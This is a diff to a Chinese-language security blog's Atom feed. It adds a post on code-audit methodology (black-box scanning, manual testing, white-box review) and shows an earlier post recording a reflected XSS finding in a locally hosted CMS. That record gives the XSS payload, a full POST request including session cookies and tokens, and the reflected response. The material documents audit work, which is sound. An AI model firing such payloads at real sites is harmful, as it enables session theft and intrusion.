@@ -6,7 +6,7 @@
   <link href="https://erickinyae.github.io/atom.xml" rel="self"/>
   
   <link href="https://erickinyae.github.io/"/>
-  <updated>2023-12-06T06:01:21.772Z</updated>
+  <updated>2023-12-08T08:10:50.180Z</updated>
   <id>https://erickinyae.github.io/</id>
   
   <author>
@@ -17,11 +17,36 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>代码审计方法论</title>
+    <link href="https://erickinyae.github.io/2023/12/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
+    <id>https://erickinyae.github.io/2023/12/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</id>
+    <published>2023-12-08T08:10:22.000Z</published>
+    <updated>2023-12-08T08:10:50.180Z</updated>
+    
+    <content type="html"><![CDATA[<p>黑盒验证 -&gt; 白盒代码级确认 -&gt; 代码修复建议</p><h2 id="第一步-目标确认、理解功能与架构"><a href="#第一步-目标确认、理解功能与架构" class="headerlink" title="第一步 目标确认、理解功能与架构"></a>第一步 目标确认、理解功能与架构</h2><ol><li>确定要审计的应用程序或系统的范围，包括具体的功能、模块或代码库。具体而言，需要收集与应用程序相关的所有文档，包括设计文档、架构文档、数据库模型等。同时收集应用程序的源代码、依赖项和配置文件；</li><li>通过收集到的信息清晰地理解到应用中具体的一些功能和所使用的架构信息，并在此基础上，标记出容易出现漏洞的部分（如写库操作、高级权限操作等）；</li></ol><h2 id="第二步-动态黑盒分析"><a href="#第二步-动态黑盒分析" class="headerlink" title="第二步  动态黑盒分析"></a>第二步  动态黑盒分析</h2><ol><li><p>配置测试环境：配置一个用于动态测试的安全环境，确保能够模拟真实攻击场景；</p></li><li><p>自动扫描：使用动态代码分析工具，包括：xray、Burp Suite等，对应用程序进行主动扫描，寻找运行时漏洞，这个部分主要是为了发现常见的OWASP Top10基本漏洞；</p></li><li><p><strong>主动测试：通过手动渗透测试，模拟攻击者行为，尝试绕过安全控制并发现更深层次的漏洞；</strong></p><blockquote><p>主要针对的有：</p><ul><li>身份验证绕过：缺失对用户身份验证的检查或绕过密码验证；</li><li>访问控制：缺失访问控制检查，导致未授权用户或角色访问敏感数据或功能；</li><li>会话管理：错误的会话处理，包括会话劫持、会话固定、未正确终止会话等，可能会导致未授权访问；</li><li>数据验证不足：对输入数据进行不足的验证，可能导致注入攻击、越权访问等问题；</li><li>业务逻辑：与应用程序的业务逻辑相关的错误，可能导致不正确的数据处理或操作；</li><li>不正确的错误处理：错误处理机制不当，可能会泄露敏感信息，或为攻击者提供有关系统的信息；</li><li>文件上传：不正确地处理用户上传的文件，可能导致恶意文件上传和执行；</li><li>多步骤操作原子性问题：缺乏适当的事务处理，导致在多步骤操作中的某些步骤失败时，系统处于不一致状态；</li><li>竞态条件：在多线程或并发操作时，由于时序不当而引发的问题，可能导致未授权访问或数据不一致；</li><li>缺乏日志监控：缺乏对关键事件和日常的日志记录和监控，使得对安全事件的检测和响应受到影响。</li></ul></blockquote></li></ol><h2 id="第三步-白盒分析"><a href="#第三步-白盒分析" class="headerlink" title="第三步 白盒分析"></a>第三步 白盒分析</h2><ol><li><p>代码分析：仔细阅读源代码，理解应用程序的工作原理、数据流和业务逻辑；</p></li><li><p>使用静态代码分析工具，尝试找到代码中存在的问题，黑盒测试找到的漏洞，需要在白盒中进行定位并找到修复方法，确定是方法使用不当、还是鉴权逻辑错误、还是第三方包漏洞等；</p><blockquote><p>主要针对的有：</p><p>数据验证：验证应用程序对输入数据的处理方式，确保实施了正确的输入验证和过滤，以防止注入攻击；</p><p>认证和授权：审查应用程序中的身份验证和授权机制，确认它们是否安全可靠。<strong>检查密码存储、会话管理和访问控制</strong>；</p><p>敏感信息：检查应用程序处理敏感信息的方式，确保数据在传输和存储时都得到适当的加密和保护（密码）；</p><p>异常处理：审查应用程序的异常处理机制和日志记录功能，确保它们不会泄漏敏感信息（SQL报错不要直接返回等），并能够帮助检测和响应安全事件；</p></blockquote></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;黑盒验证 -&amp;gt; 白盒代码级确认 -&amp;gt; 代码修复建议&lt;/p&gt;
+&lt;h2 id=&quot;第一步-目标确认、理解功能与架构&quot;&gt;&lt;a href=&quot;#第一步-目标确认、理解功能与架构&quot; class=&quot;headerlink&quot; title=&quot;第一步 目标确认、理解功能与架构&quot;&gt;&lt;/a</summary>
+      
+    
+    
+    
+    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="代码审计" scheme="https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
     <title>代码审计-漏洞记录</title>
     <link href="https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
     <id>https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</id>
     <published>2023-12-06T05:56:28.000Z</published>
-    <updated>2023-12-06T06:01:21.772Z</updated>
+    <updated>2023-12-07T07:44:59.795Z</updated>
     
     <content type="html"><![CDATA[<hr><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><table><thead><tr><th>URL</th><th><a href="http://localhost:8888/system/cms/content/page?categoryId=">http://localhost:8888/system/cms/content/page?categoryId=</a></th></tr></thead><tbody><tr><td>ParamPosition</td><td><code>body</code></td></tr><tr><td>ParamKey</td><td><code>title</code></td></tr><tr><td>Payload</td><td><code>&quot;&gt;&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</code></td></tr><tr><td>Request1</td><td><code>POST /system/cms/content/page?categoryId= HTTP/1.1 Host: localhost:8888 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 118 Accept: text/html, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: vue_admin_template_token=admin-token; sidebarStatus=1; remember-me=YWRtaW46MTcwMjg4MzgxNDczNjo5ZjkwYmVhZTJhYjZiNjQyMzdhODNkZDhkMTRjNDJjZA; XSRF-TOKEN=7846bad7-ebe4-48a8-8cfb-3d72a7ab1564; cms_token=226553f96fb74a328f9798f1424850fe; dreamer-cms-s=c1544459-e4a0-4ea3-99c5-0ddebf2cae66; pb-cms-qq=; pb-cms-email=956968575@qq.com; JSESSIONID=F5F5CB00146F24022BB0EDA921A43D40; pageno_cookie=1; SHIRO_SESSION_ID=69dc1ad1-a73c-458c-87a0-531cf132c0f1; SESSION=ef82c6e0-dade-404a-8183-85c3b67dc7c7; bjui_theme=blue; Idea-fa2b9155=227d5999-324b-42f9-af39-22bf2f71aa49 Origin: http://localhost:8888 Referer: http://localhost:8888/system Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-Requested-With: XMLHttpRequest Accept-Encoding: gzip orderDirection=&amp;orderField=&amp;pageCurrent=1&amp;pageSize=30&amp;status=&amp;title=%22%3E%3CsCrIpT%3Eywrwavrxad%3C%2FsCrIpT%3E&amp;total=</code>Copy</td></tr><tr><td>Response1</td><td>&#96;HTTP&#x2F;1.1 200  Content-Language: zh-CN Content-Type: text&#x2F;html;charset&#x3D;UTF-8 Date: Wed, 06 Dec 2023 02:58:02 GMT <div class="bjui-pageHeader">    <form id="pagerForm" data-toggle="ajaxsearch" action="/system/cms/content/page?categoryId=" method="post">        <input type="hidden" name="pageSize" value="30">        <input type="hidden" name="pageCurrent" value="0">        <input type="hidden" name="orderField" value>        <input type="hidden" name="orderDirection" value>        <div class="bjui-searchBar">            <label>状态:</label>            <select name="status" data-toggle="selectpicker">                <option value selected>所有</option>                <option value="-1"> 删除</option>                <option value="0"> 草稿</option>                <option value="1"> 发布 </option>            </select>             <label>标题：</label><input type="text" value><sCrIpT>ywrwavrxad</sCrIpT>“ name&#x3D;”title” class&#x3D;”form-control” size&#x3D;”15”&gt;             <button type="submit" class="btn-default" data-icon="search">查询</button>             <a class="btn btn-orange" href="javascript:;" data-toggle="reloadsearch" data-clear-query="true" data-icon="undo">刷新全部</a>                         <div class="pull-right">                &lt;!–&lt;button type&#x3D;”button” class&#x3D;”btn-blue” data-url&#x3D;”ajaxDone2.html?id&#x3D;</div></div></form></div></td></tr></tbody></table>]]></content>
     
